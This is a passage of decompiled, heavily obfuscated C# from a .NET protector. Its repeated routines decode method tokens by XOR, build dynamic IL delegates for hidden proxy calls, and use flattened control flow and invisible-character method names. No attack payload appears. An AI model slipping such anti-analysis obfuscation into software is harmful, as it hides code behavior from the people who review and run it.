    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[2] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogjBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogjBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogJBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogJBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 16444 - 37860 + 21416;
    MethodInfo methodInfo;
    Type[] parameterTypes;
    FieldInfo fieldFromHandle;
    MethodBase method;
    DynamicMethod dynamicMethod;
    Type fieldType;
    Type declaringType;
    do
    {
      if (num1 != 62064 + 35543 - 97591)
        goto label_3;
label_2:
      MethodInfo[] methods;
      int index1;
      methodInfo = methods[index1];
      num1 = 49054 - 1749 - 47288;
label_3:
      if (num1 != 72199 - 77637 + 5462)
        goto label_6;
label_4:
      int index2;
      if (index2 >= parameterTypes.Length)
        num1 = 10114 - 36089 + 26000;
      else
        goto label_32;
label_6:
      int metadataToken;
      if (num1 == 18835 + 45717 - 64547)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 36194 - 124640 + 88452;
      }
      if (num1 == 41535 + 54044 - 95567)
      {
        parameterTypes = (Type[]) null;
        num1 = 80439 - 31813 - 48613;
      }
      if (num1 == 66461 - 94838 + 28400)
      {
        ++index2;
        num1 = 70099 - 65882 - 4193;
      }
      byte[] numArray;
      int num2;
      if (num1 == 64030 - 114832 + 50806)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num3 = num2 - 1]) << 0) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num5 = num4 - 1]) << 24);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[0] ^ (int) numArray[num2 = num7 - 1]) << 16;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogkBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogkBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 52134 - 117620 + 65491;
      }
      if (num1 == 65228 - 64635 - 592)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 15060 - 81533 + 66475;
      }
      if (num1 == 27102 - 10499 - 16593)
        return;
      ParameterInfo[] parameters;
      if (num1 == 91124 - 36498 - 54607)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 33855 - 90879 + 57044;
      }
      if (num1 == 25849 - 47440 + 21597)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 48977 - 103849 + 54879;
      }
      if (num1 != 33327 + 18888 - 52204)
        goto label_23;
label_22:
      dynamicMethod = (DynamicMethod) null;
      num1 = 85927 + 1268 - 87183;
label_23:
      if (num1 != 75194 - 167156 + 91977)
      {
        if (num1 != 87859 - 50072 - 37766)
        {
          if (num1 == 32020 - 116808 + 84795)
          {
            fieldType = fieldFromHandle.FieldType;
            num1 = 42520 - 129310 + 86798;
          }
          if (num1 == 49585 - 44533 - 5027)
          {
            declaringType = method.DeclaringType;
            num1 = 93761 - 93118 - 617;
          }
          if (num1 == 9256 + 43893 - 53135)
          {
            index1 = 0;
            num1 = 45712 - 126150 + 80453;
          }
          if (num1 != 57927 + 14270 - 72175)
            goto label_33;
        }
        else
          goto label_4;
      }
      else
        goto label_57;
label_32:
      parameterTypes[index2] = parameters[index2].ParameterType;
      num1 = 61787 + 29409 - 91173;
label_33:
      if (num1 == 93903 - 139273 + 45372)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 27262 - 3844 - 23415;
      }
      if (num1 == 19277 - 21022 + 1765)
      {
        index2 = 0;
        num1 = 28648 - 12594 - 16033;
      }
      if (num1 == 70084 - 93198 + 23123)
      {
        fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
        num1 = 65406 - 81303 + 15907;
      }
      if (num1 == 82156 - 149451 + 67298)
      {
        num2 = numArray.Length;
        num1 = 91359 - 146070 + 54715;
      }
      if (num1 == 74208 - 31379 - 42811)
      {
        parameters = methodInfo.GetParameters();
        num1 = 57312 - 29789 - 27504;
      }
      if (num1 == 21087 + 20773 - 41852)
      {
        if (method.IsStatic)
          num1 = 93621 - 6705 - 86907;
        else
          goto label_22;
      }
      if (num1 == 42768 + 41425 - 84180)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 81611 - 111124 + 29527;
      }
      if (num1 == 458 + 98851 - 99292)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 37102 - 56888 + 19804;
        }
        else
        {
          ++index1;
          goto label_57;
        }
      }
      if (num1 == 16820 + 57330 - 74150)
        num1 = 56268 - 12993 - 43274;
      continue;
label_57:
      if (index1 < methods.Length)
        goto label_2;
      else
        goto label_58;
    }
    while (num1 != 13057 + 23875 - 36906);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[2] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogkBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogkBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogKBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogKBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 90656 - 94505 + 3849;
    FieldInfo fieldFromHandle;
    MethodInfo methodInfo;
    Type fieldType;
    Type[] parameterTypes;
    MethodBase method;
    Type declaringType;
    DynamicMethod dynamicMethod;
    do
    {
      byte[] numArray;
      int num2;
      int metadataToken;
      if (num1 == 80603 - 162534 + 81935)
      {
        int num3;
        int num4;
        int num5;
        int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[3] ^ (int) numArray[num3 = num2 - 1]) << 16) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num5 = num4 - 1]) << 0);
        int num7 = num5 - 1;
        int num8 = ((int) fieldFromHandle.Name[0] ^ (int) numArray[num2 = num7 - 1]) << 24;
        metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoglBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoglBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
        num1 = 74261 - 59910 - 14346;
      }
      if (num1 == 74180 - 101921 + 27751)
        return;
      if (num1 != 31727 - 24763 - 6948)
        goto label_6;
label_5:
      MethodInfo[] methods;
      int index1;
      methodInfo = methods[index1];
      num1 = 37770 - 77670 + 39917;
label_6:
      int index2;
      if (num1 == 11116 + 55422 - 66518)
      {
        index2 = 0;
        num1 = 23007 - 88944 + 65958;
      }
      if (num1 == 53353 - 108697 + 55357)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 98578 - 144637 + 46073;
      }
      if (num1 == 50001 - 119262 + 69268)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 80330 - 67804 - 12518;
      }
      if (num1 != 47592 - 40200 - 7370)
        goto label_14;
label_13:
      ParameterInfo[] parameters;
      parameterTypes[index2] = parameters[index2].ParameterType;
      num1 = 84946 - 184088 + 99165;
label_14:
      if (num1 == 92052 - 67158 - 24882)
      {
        parameterTypes = (Type[]) null;
        num1 = 1932 + 44790 - 46709;
      }
      if (num1 == 36325 - 46354 + 10035)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 96989 - 81034 - 15948;
      }
      if (num1 != 37330 - 99297 + 61982)
      {
        if (num1 == 58989 - 65700 + 6716)
        {
          metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
          num1 = 81677 - 154882 + 73211;
        }
        if (num1 == 60090 - 159607 + 99536)
        {
          parameterTypes = new Type[parameters.Length];
          num1 = 94430 - 162327 + 67917;
        }
        if (num1 == 32546 - 106719 + 74182)
        {
          fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
          num1 = 11525 + 67352 - 78867;
        }
        if (num1 == 41075 - 1109 - 39964)
        {
          numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
          num1 = 8648 - 92287 + 83642;
        }
        if (num1 == 36037 - 51554 + 15535)
        {
          parameters = methodInfo.GetParameters();
          num1 = 53320 - 9890 - 43411;
        }
        if (num1 != 50535 - 46828 - 3683)
          goto label_32;
label_30:
        if (index2 >= parameterTypes.Length)
          num1 = 23347 + 63999 - 87321;
        else
          goto label_13;
label_32:
        if (num1 == 92449 - 57549 - 34899)
        {
          fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
          num1 = 51671 - 124813 + 73144;
        }
        if (num1 == 48771 + 47172 - 95926)
        {
          if ((object) methodInfo.DeclaringType == (object) fieldType)
          {
            num1 = 42118 - 106857 + 64757;
          }
          else
          {
            ++index1;
            goto label_57;
          }
        }
        if (num1 == 41765 - 68404 + 26642)
        {
          num2 = numArray.Length;
          num1 = 83114 - 95454 + 12344;
        }
        if (num1 == 3405 - 16738 + 13347)
        {
          index1 = 0;
          num1 = 10143 + 23074 - 33202;
        }
        if (num1 != 57676 - 49259 - 8396)
        {
          if (num1 == 64234 - 108745 + 44519)
          {
            if (method.IsStatic)
              num1 = 86861 - 107431 + 20579;
            else
              goto label_50;
          }
          if (num1 == 43968 - 67806 + 23863)
          {
            declaringType = method.DeclaringType;
            num1 = 66819 - 87151 + 20358;
          }
          if (num1 == 87715 - 176261 + 88569)
          {
            ++index2;
            num1 = 22268 + 50777 - 73021;
          }
          if (num1 != 16769 - 73470 + 56712)
            goto label_51;
label_50:
          dynamicMethod = (DynamicMethod) null;
          num1 = 91338 - 166941 + 75615;
label_51:
          if (num1 == 73973 - 138707 + 64734)
            num1 = 1697 - 79625 + 77929;
          continue;
        }
        goto label_30;
      }
label_57:
      if (index1 < methods.Length)
        goto label_5;
      else
        goto label_58;
    }
    while (num1 != 64747 - 162721 + 98000);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[2] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
    dynamicIlInfo.SetCode(code, parameterTypes.Length + 1);
    fieldFromHandle.SetValue((object) null, (object) dynamicMethod.CreateDelegate(fieldType));
  }

  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  static extern int Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDoglBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDoglBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] int obj0);

  static void Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogLBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogLBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(
    [In] RuntimeFieldHandle obj0,
    [In] byte obj1)
  {
    int num1 = 37362 - 133257 + 95895;
    Type[] parameterTypes;
    MethodBase method;
    FieldInfo fieldFromHandle;
    DynamicMethod dynamicMethod;
    MethodInfo methodInfo;
    Type fieldType;
    Type declaringType;
    do
    {
      if (num1 != 20238 - 115290 + 95074)
        goto label_3;
label_2:
      int index1;
      ParameterInfo[] parameters;
      parameterTypes[index1] = parameters[index1].ParameterType;
      num1 = 79458 + 6062 - 85497;
label_3:
      if (num1 == 392 + 88481 - 88865)
      {
        if (method.IsStatic)
          num1 = 92989 - 41259 - 51721;
        else
          goto label_15;
      }
      int metadataToken;
      if (num1 == 50588 + 44632 - 95214)
      {
        method = fieldFromHandle.Module.ResolveMethod(metadataToken);
        num1 = 41106 + 35374 - 76473;
      }
      if (num1 == 1850 - 9801 + 7952)
      {
        fieldFromHandle = FieldInfo.GetFieldFromHandle(obj0);
        num1 = 68903 - 63373 - 5528;
      }
      MethodInfo[] methods;
      if (num1 == 39578 + 55844 - 95409)
      {
        methods = fieldFromHandle.FieldType.GetMethods(BindingFlags.Instance | BindingFlags.NonPublic);
        num1 = 24507 + 45933 - 70426;
      }
      int index2;
      if (num1 == 22358 - 38378 + 16034)
      {
        index2 = 0;
        num1 = 92674 - 36008 - 56651;
      }
      if (num1 != 77947 - 49662 - 28274)
        goto label_16;
label_15:
      dynamicMethod = (DynamicMethod) null;
      num1 = 71214 - 47194 - 24008;
label_16:
      if (num1 == 86749 - 120747 + 34016)
      {
        parameters = methodInfo.GetParameters();
        num1 = 13013 - 100090 + 87096;
      }
      if (num1 != 82714 - 31006 - 51692)
        goto label_20;
label_19:
      methodInfo = methods[index2];
      num1 = 21527 - 16521 - 4989;
label_20:
      if (num1 == 87942 - 129939 + 42016)
      {
        parameterTypes = new Type[parameters.Length];
        num1 = 89546 - 186401 + 96875;
      }
      if (num1 == 90088 - 55568 - 34513)
      {
        fieldType = fieldFromHandle.FieldType;
        num1 = 18438 - 103435 + 85005;
      }
      if (num1 == 35686 - 112039 + 76358)
      {
        metadataToken *= fieldFromHandle.GetCustomAttributes(false)[0].GetHashCode();
        num1 = 38563 - 67205 + 28648;
      }
      byte[] numArray;
      int num2;
      if (num1 == 21843 + 48198 - 70038)
      {
        num2 = numArray.Length;
        num1 = 83944 - 115842 + 31902;
      }
      if (num1 == 13712 + 71511 - 85206)
      {
        if ((object) methodInfo.DeclaringType == (object) fieldType)
        {
          num1 = 8312 - 80993 + 72699;
        }
        else
        {
          ++index2;
          goto label_57;
        }
      }
      if (num1 == 18734 - 3882 - 14840)
      {
        parameterTypes = (Type[]) null;
        num1 = 68173 + 11045 - 79205;
      }
      if (num1 == 14635 - 75103 + 60488)
      {
        index1 = 0;
        num1 = 31398 - 91686 + 60309;
      }
      if (num1 == 89494 - 99846 + 10354)
      {
        numArray = fieldFromHandle.Module.ResolveSignature(fieldFromHandle.MetadataToken);
        num1 = 49011 - 54114 + 5106;
      }
      if (num1 == 61231 + 10737 - 71945)
      {
        ++index1;
        num1 = 23043 - 27894 + 4875;
      }
      if (num1 != 34245 + 34950 - 69180)
      {
        if (num1 == 11669 - 90993 + 79328)
        {
          int num3;
          int num4;
          int num5;
          int num6 = fieldFromHandle.GetOptionalCustomModifiers()[0].MetadataToken + (((int) fieldFromHandle.Name[4] ^ (int) numArray[num3 = num2 - 1]) << 16) + (((int) fieldFromHandle.Name[1] ^ (int) numArray[num4 = num3 - 1]) << 8) + (((int) fieldFromHandle.Name[2] ^ (int) numArray[num5 = num4 - 1]) << 0);
          int num7 = num5 - 1;
          int num8 = ((int) fieldFromHandle.Name[3] ^ (int) numArray[num2 = num7 - 1]) << 24;
          metadataToken = \u003CModule\u003E.Beds\u002DProtector\u002Drown\u002DFoxᅠᅠᅠᅠᅠJumped\u002DOver\u002DThe\u002DLazy\u002DDogmBThe\u002DᅠᅠᅠᅠQuick\u002DBrown\u002Dᅠᅠᅠᅠᅠᅠe\u002DLazy\u002DDogmBᅠᅠᅠᅠᅠThe\u002DQuick\u002D\u002DOver\u002DThe\u002DLaᅠᅠᅠᅠzyᅠ(num6 + num8);
          num1 = 61814 - 131608 + 69799;
        }
        if (num1 != 70164 - 22915 - 47225)
          goto label_45;
label_43:
        if (index1 >= parameterTypes.Length)
          num1 = 97153 - 28103 - 69025;
        else
          goto label_2;
label_45:
        if (num1 == 68160 - 18625 - 49510)
        {
          declaringType = method.DeclaringType;
          num1 = 9729 - 23545 + 13842;
        }
        if (num1 == 43964 + 21548 - 65503)
        {
          fieldFromHandle.SetValue((object) null, (object) Delegate.CreateDelegate(fieldType, (MethodInfo) method));
          num1 = 80099 - 99157 + 19068;
        }
        if (num1 == 753 - 28246 + 27503)
          return;
        if (num1 != 60363 + 10024 - 70366)
        {
          if (num1 == 80980 - 12374 - 68606)
            num1 = 40554 - 93238 + 52685;
          continue;
        }
        goto label_43;
      }
label_57:
      if (index2 < methods.Length)
        goto label_19;
      else
        goto label_58;
    }
    while (num1 != 57881 - 37633 - 20222);
    dynamicMethod = new DynamicMethod("", methodInfo.ReturnType, parameterTypes, declaringType.IsInterface || declaringType.IsArray ? fieldType : declaringType, true);
label_58:
    DynamicILInfo dynamicIlInfo = dynamicMethod.GetDynamicILInfo();
    dynamicIlInfo.SetLocalSignature(new byte[2]
    {
      (byte) 7,
      (byte) 0
    });
    byte[] code = new byte[7 * parameterTypes.Length + 6];
    int num9 = 0;
    ParameterInfo[] parameters1 = method.GetParameters();
    int index3 = method.IsConstructor ? 0 : -1;
    for (int index4 = 0; index4 < parameterTypes.Length; ++index4)
    {
      byte[] numArray1 = code;
      int index5 = num9;
      int num10 = index5 + 1;
      numArray1[index5] = (byte) 14;
      byte[] numArray2 = code;
      int index6 = num10;
      int num11 = index6 + 1;
      int num12 = (int) (byte) index4;
      numArray2[index6] = (byte) num12;
      Type type = index3 == -1 ? method.DeclaringType : parameters1[index3].ParameterType;
      if (type.IsClass && !type.IsPointer && !type.IsByRef)
      {
        int tokenFor = dynamicIlInfo.GetTokenFor(type.TypeHandle);
        byte[] numArray3 = code;
        int index7 = num11;
        int num13 = index7 + 1;
        numArray3[index7] = (byte) 116;
        byte[] numArray4 = code;
        int index8 = num13;
        int num14 = index8 + 1;
        int num15 = (int) (byte) tokenFor;
        numArray4[index8] = (byte) num15;
        byte[] numArray5 = code;
        int index9 = num14;
        int num16 = index9 + 1;
        int num17 = (int) (byte) (tokenFor >> 8);
        numArray5[index9] = (byte) num17;
        byte[] numArray6 = code;
        int index10 = num16;
        int num18 = index10 + 1;
        int num19 = (int) (byte) (tokenFor >> 16);
        numArray6[index10] = (byte) num19;
        byte[] numArray7 = code;
        int index11 = num18;
        num9 = index11 + 1;
        int num20 = (int) (byte) (tokenFor >> 24);
        numArray7[index11] = (byte) num20;
      }
      else
        num9 = num11 + 5;
      ++index3;
    }
    byte[] numArray8 = code;
    int index12 = num9;
    int num21 = index12 + 1;
    int num22 = (int) (byte) ((uint) (byte) fieldFromHandle.Name[0] ^ (uint) obj1);
    numArray8[index12] = (byte) num22;
    int tokenFor1 = dynamicIlInfo.GetTokenFor(method.MethodHandle);
    byte[] numArray9 = code;
    int index13 = num21;
    int num23 = index13 + 1;
    int num24 = (int) (byte) tokenFor1;
    numArray9[index13] = (byte) num24;
    byte[] numArray10 = code;
    int index14 = num23;
    int num25 = index14 + 1;
    int num26 = (int) (byte) (tokenFor1 >> 8);
    numArray10[index14] = (byte) num26;
    byte[] numArray11 = code;
    int index15 = num25;
    int num27 = index15 + 1;
    int num28 = (int) (byte) (tokenFor1 >> 16);
    numArray11[index15] = (byte) num28;
    byte[] numArray12 = code;
    int index16 = num27;
    int index17 = index16 + 1;
    int num29 = (int) (byte) (tokenFor1 >> 24);
    numArray12[index16] = (byte) num29;
    code[index17] = (byte) 42;
